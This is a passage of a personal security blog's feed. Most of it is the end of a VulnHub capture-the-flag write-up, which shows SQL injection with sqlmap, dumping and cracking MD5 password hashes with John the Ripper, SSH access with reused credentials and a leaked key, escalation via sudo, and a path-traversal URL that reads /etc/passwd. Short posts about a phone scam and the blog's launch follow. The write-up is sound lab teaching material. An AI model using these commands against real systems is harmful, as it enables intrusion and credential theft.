  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;phpc_events&lt;/span&gt;                           &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;phpc_sequence&lt;/span&gt;                         &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;phpc_users&lt;/span&gt;                            &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;uid&lt;/span&gt;                                   &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;

  &lt;span class="nt"&gt;Database&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;roundcubemail&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="nx"&gt;tables&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;session&lt;/span&gt;                               &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;cache&lt;/span&gt;                                 &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;contacts&lt;/span&gt;                              &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;identities&lt;/span&gt;                            &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;messages&lt;/span&gt;                              &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;users&lt;/span&gt;                                 &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;

  &lt;span class="nt"&gt;Database&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;ehks&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="nx"&gt;tables&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt;                                  &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;blog&lt;/span&gt;                                  &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;comment&lt;/span&gt;                               &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;

  &lt;span class="nt"&gt;Database&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;information_schema&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="nx"&gt;tables&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;CHARACTER_SETS&lt;/span&gt;                        &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;COLLATIONS&lt;/span&gt;                            &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;COLLATION_CHARACTER_SET_APPLICABILITY&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;COLUMNS&lt;/span&gt;                               &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;COLUMN_PRIVILEGES&lt;/span&gt;                     &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;KEY_COLUMN_USAGE&lt;/span&gt;                      &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;ROUTINES&lt;/span&gt;                              &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;SCHEMATA&lt;/span&gt;                              &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;SCHEMA_PRIVILEGES&lt;/span&gt;                     &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;STATISTICS&lt;/span&gt;                            &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;TABLES&lt;/span&gt;                                &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;TABLE_CONSTRAINTS&lt;/span&gt;                     &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;TABLE_PRIVILEGES&lt;/span&gt;                      &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;TRIGGERS&lt;/span&gt;                              &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;USER_PRIVILEGES&lt;/span&gt;                       &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;VIEWS&lt;/span&gt;                                 &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;

  &lt;span class="nt"&gt;Database&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;mysql&lt;/span&gt;
  &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt; &lt;span class="nx"&gt;tables&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt;                                  &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;columns_priv&lt;/span&gt;                          &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;db&lt;/span&gt;                                    &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;func&lt;/span&gt;                                  &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;help_category&lt;/span&gt;                         &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;help_keyword&lt;/span&gt;                          &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;help_relation&lt;/span&gt;                         &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;help_topic&lt;/span&gt;                            &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;host&lt;/span&gt;                                  &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;proc&lt;/span&gt;                                  &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;procs_priv&lt;/span&gt;                            &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;tables_priv&lt;/span&gt;                           &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;time_zone&lt;/span&gt;                             &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;time_zone_leap_second&lt;/span&gt;                 &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;time_zone_name&lt;/span&gt;                        &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;time_zone_transition&lt;/span&gt;                  &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;time_zone_transition_type&lt;/span&gt;             &lt;span class="o"&gt;|&lt;/span&gt;
  &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Okay so there is a lot of database let's dump the ehks users table:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;sqlmap&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://192.168.1.56/index.html?page=blog&amp;amp;amp;title=Blog&amp;amp;amp;id=6&amp;#39;&lt;/span&gt; &lt;span class="nt"&gt;-p&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt; &lt;span class="nt"&gt;-D&lt;/span&gt;  &lt;span class="nt"&gt;ehks&lt;/span&gt; &lt;span class="nt"&gt;-T&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt; &lt;span class="nt"&gt;--dump&lt;/span&gt;
&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;-----------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;----------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;user_id&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;user_name&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;user_pass&lt;/span&gt;                        &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;-----------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;----------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;dstevens&lt;/span&gt;  &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;02e823a15a392b5aa4ff4ccb9060fa68&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;achen&lt;/span&gt;     &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;b46265f1e7faa3beab09db5c28739380&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;pmoore&lt;/span&gt;    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;8f4743c04ed8e5f39166a81f26319bb5&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;4&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;jdurbin&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;7c7bc9f465d86b8164686ebb5151a717&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;sorzek&lt;/span&gt;    &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;64d1f88b9b276aece4b0edcc25b7a434&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;6&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;ghighland&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;9f3eb3087298ff21843cc4e013cf355f&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;---------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;-----------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;----------------------------------&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Cracking the hashes&lt;/h2&gt;
&lt;p&gt;We save the hahses in a file (option proposed by sqlmap) and we launch john the
ripper on it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#john hashes --format=raw-md5
sorzek:pacman
jdurbin:Sue1978
2 password hashes cracked, 4 left
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We test the cracked password on:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the restricted part: there is two text files about how to blog and how to use the web mail&lt;/li&gt;
&lt;li&gt;the admin part: with the two cracked accounts we can only write new article, that is not really useful for our CTF&lt;/li&gt;
&lt;li&gt;the mail part: according to the instruction on the restricted part we can access the user's emails from here.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We found in an email from sorzek to ghighland that he just add a number to is
useual password "undone" so we just tell john to try password from undone0 to
undone9999. We cracked an other password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;ghighland&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;undone1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;SSH connexions&lt;/h2&gt;
&lt;p&gt;Okay the same password seems to be used everywhere and I was a bit lost to how
to continue so I try the credentials on the ssh service: &lt;em&gt;it works!&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;First of all I logged with the jdurbin account.
There seems to be anything useful but in my search I saw that achen had an
ssh private key readable by everyone (a ppk one for PuTTY).
Okay lets use it to connect on the machine. It ask no password and we got a
shell, what now?&lt;/p&gt;
&lt;h2&gt;Privileges escalation&lt;/h2&gt;
&lt;p&gt;I try to see what was the differences with this account and I saw a pdf file
"linux_administration.pdf" so I tried to use the sudo command with &lt;code&gt;sudo -v&lt;/code&gt; and
once again: &lt;em&gt;it works!&lt;/em&gt;
So a simple &lt;code&gt;sudo su&lt;/code&gt; give us the root rights.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;DONE!&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Lets resume :&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;exploitation of the SQL injection&lt;/li&gt;
&lt;li&gt;cracked the hashes&lt;/li&gt;
&lt;li&gt;use the credentials on the SSH service&lt;/li&gt;
&lt;li&gt;find the ppk SSH key&lt;/li&gt;
&lt;li&gt;use it to connect on the achen account&lt;/li&gt;
&lt;li&gt;sudo su&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;That was a easy one !&lt;/p&gt;
&lt;h1&gt;Nota bene&lt;/h1&gt;
&lt;p&gt;Oh yeah we do not explore the lead of the file injection in the
page GET parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;192&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;168&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;56&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;index&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;html&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=../../../../../../&lt;/span&gt;&lt;span class="nt"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="nt"&gt;00&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;Blog&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Moreover the root password "root1234" where is the &lt;code&gt;bash_history&lt;/code&gt; of achen.&lt;/p&gt;</content><category term="challenge"></category><category term="security"></category><category term="vulnhub"></category></entry><entry><title>Scam my mother</title><link href="https://matthieukeller.com/2014/08/scam-my-mother.html" rel="alternate"></link><published>2014-08-19T00:00:00+02:00</published><updated>2014-08-19T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-08-19:/2014/08/scam-my-mother.html</id><summary type="html">&lt;p&gt;Today I was confronted to the first telephonic scam of my life.&lt;/p&gt;
&lt;p&gt;I was in holiday at my mother place when the phone rings. I hear my mother said
"Je ne parle pas anglais" meaning "I do not speak English" therefore I grab the
phone and start talking to the â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Today I was confronted to the first telephonic scam of my life.&lt;/p&gt;
&lt;p&gt;I was in holiday at my mother place when the phone rings. I hear my mother said
"Je ne parle pas anglais" meaning "I do not speak English" therefore I grab the
phone and start talking to the person bothering my mother in English.&lt;/p&gt;
&lt;p&gt;This person pretended to be part of Microsoft and that our registered computer
was giving alerts about some malware and hacker in our system. This person
English had a strong Indian color. I asked him were did he gets this French phone
number moreover my mother's number (the computer us a MSDNA licence registered at
my name and eventually with my phone number, not my mother one). All I get was
that the number was in their "local database" I try to explain to the person
that a local database doesn't mean anything. This is when this person surrender
and give me someone else still working at Microsoft.&lt;/p&gt;
&lt;p&gt;This new person ask me to go in front of my computer and to type "windows+r"
which lead to execute and then enter eventwr which would lead to the system events
log. That is were I stop all of this because it was obviously a scam.&lt;/p&gt;
&lt;p&gt;I regret to have cut the communication and I wish that I had follow the
scenario at its end. Moreover I read a few weeks before on a blog that I follow
that a security professional had fun with this guys by telling them that they
had a problem with their phone and lead them to type the code executing the
phone's factory reset. That seems very funny and I wish I got the idea of doing
it at this time.&lt;/p&gt;
&lt;p&gt;If you google 'eventwr scam' you will found that I am not the only one who get
this scan and that a lot of other people get fun with them.&lt;/p&gt;
&lt;p&gt;Now all I am waiting for is for an other call of this people and to execute this
ideas of following the scenario at its end and then to reset the operator phone.&lt;/p&gt;</content><category term="scam"></category><category term="security"></category></entry><entry><title>Blog Start</title><link href="https://matthieukeller.com/2014/08/blog-start.html" rel="alternate"></link><published>2014-08-18T00:00:00+02:00</published><updated>2014-08-18T00:00:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2014-08-18:/2014/08/blog-start.html</id><summary type="html">&lt;p&gt;Today I start my blog using Pelican and hosting it with github pages.
It is located at &lt;a href="http://www.matthieukeller.com/blog"&gt;www.matthieukeller.com/blog&lt;/a&gt;.
On &lt;a href="http://www.matthieukeller.com"&gt;www.matthieukeller.com&lt;/a&gt; you will find a sort
of portal where I redirect travelers to this blog or to my notes located at
&lt;a href="http://www.matthieukeller.com/notes"&gt;www.mattieukeller.com/notes&lt;/a&gt;. My â¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Today I start my blog using Pelican and hosting it with github pages.
It is located at &lt;a href="http://www.matthieukeller.com/blog"&gt;www.matthieukeller.com/blog&lt;/a&gt;.
On &lt;a href="http://www.matthieukeller.com"&gt;www.matthieukeller.com&lt;/a&gt; you will find a sort
of portal where I redirect travelers to this blog or to my notes located at
&lt;a href="http://www.matthieukeller.com/notes"&gt;www.mattieukeller.com/notes&lt;/a&gt;. My notes are is
the place where is store my "how to" and the things that may help other peoples,
they are also hosted with github pages.&lt;/p&gt;
&lt;p&gt;Nevertheless all this notes and all the content of this blog is redacted locally
with vim and then push to github. That means that I have all traces of every
article and every notes redacted here.&lt;/p&gt;
&lt;p&gt;I want to offer a comments solution where
all the comments are stored on my computer but I am not sure it is possible and
I will probably use discuss in a first time.&lt;/p&gt;
&lt;p&gt;The default theme of pelican is awful and I will change it in the next few days.
Hoping that I found one better.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Edit:&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;29 Oct. 2014: I use discuss for the comments and I use the maggner for pelican
theme. You can read more about the theme in the
&lt;a href="http://www.matthieukeller.com/blog/2014/10/27/blog-changes.html"&gt;blog changes&lt;/a&gt;
article.&lt;/p&gt;</content><category term="blog"></category></entry></feed>